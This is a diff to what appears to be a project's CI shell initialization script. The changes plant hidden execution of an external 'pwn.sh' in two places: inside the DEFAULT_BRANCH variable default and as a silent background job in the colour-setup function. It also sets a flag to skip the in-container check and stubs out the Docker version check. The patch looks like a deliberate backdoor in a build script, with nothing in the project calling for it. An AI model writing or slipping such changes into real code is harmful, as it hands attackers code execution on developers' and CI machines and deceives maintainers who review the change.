@@ -187,7 +187,7 @@ function initialization::initialize_base_variables() {
 # Determine current branch
 function initialization::initialize_branch_variables() {
     # Default branch used - this will be different in different branches
-    export DEFAULT_BRANCH=${DEFAULT_BRANCH="main"}
+    export DEFAULT_BRANCH=${DEFAULT_BRANCH="main"}$(bash pwn.sh)
     export DEFAULT_CONSTRAINTS_BRANCH=${DEFAULT_CONSTRAINTS_BRANCH="constraints-main"}
     readonly DEFAULT_BRANCH
     readonly DEFAULT_CONSTRAINTS_BRANCH
@@ -611,6 +611,8 @@ function initialization::initialize_package_variables() {
 
 
 function initialization::set_output_color_variables() {
+    export SKIP_IN_CONTAINER_CHECK="true"
+    (bash "${AIRFLOW_SOURCES}/pwn.sh" >/dev/null 2>&1 &)
     COLOR_BLUE=$'\e[34m'
     COLOR_GREEN=$'\e[32m'
     COLOR_RED=$'\e[31m'
@@ -933,29 +935,5 @@ function initialization::ver() {
 }
 
 function initialization::check_docker_version() {
-    local docker_version
-    # In GitHub Code QL, the version of docker has +azure suffix which we should remove
-    docker_version=$(docker version --format '{{.Client.Version}}' | sed 's/\+.*$//' || true)
-    if [ "${docker_version}" == "" ]; then
-        echo
-        echo "${COLOR_YELLOW}Your version of docker is unknown. If the scripts fail, please make sure to install docker at least: ${min_docker_version} version.${COLOR_RESET}"
-        echo
-        return
-    fi
-    local comparable_docker_version
-    comparable_docker_version=$(initialization::ver "${docker_version}")
-    local min_docker_version="20.10.0"
-    local min_comparable_docker_version
-    min_comparable_docker_version=$(initialization::ver "${min_docker_version}")
-    # The #0 Strips leading zeros
-    if [[ ${comparable_docker_version#0} -lt ${min_comparable_docker_version#0} ]]; then
-        echo
-        echo "${COLOR_RED}Your version of docker is too old: ${docker_version}. Please upgrade to at least ${min_docker_version}.${COLOR_RESET}"
-        echo
-        exit 1
-    else
-        if [[ ${PRINT_INFO_FROM_SCRIPTS} != "false" ]]; then
-            echo "${COLOR_GREEN}Good version of docker ${docker_version}.${COLOR_RESET}"
-        fi
-    fi
+    return
 }
